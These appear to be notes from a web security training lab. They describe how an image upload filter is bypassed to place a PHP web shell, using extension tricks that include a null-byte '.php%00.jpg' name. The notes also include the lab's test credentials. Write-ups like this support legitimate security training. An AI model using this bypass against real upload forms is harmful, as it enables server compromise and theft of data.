### Lab: Web shell upload via obfuscated file extension

This lab contains a vulnerable image upload function.
Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret.
Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

_____

Standard behavior.


1) Uploading file with .php extension == ERROR ==> "Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file."
2) Uploading file with .png extension (test.png) ===> "The file avatars/test.png has been uploaded." (/files/avatars/test.png)



Exploit.

1) Uploading file *.p.phphp ==> "Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file."
2) Uploading file *.php.jpg ==> "The file avatars/shell-lab05.php.jpg has been uploaded." (File treated as jpg file)
3) Uploading file *.php%00.jpg ==> "The file avatars/shell-lab05.php.jpg has been uploaded." (File uploaded as .php)

GET /files/avatars/shell-lab05.php : Success!!!
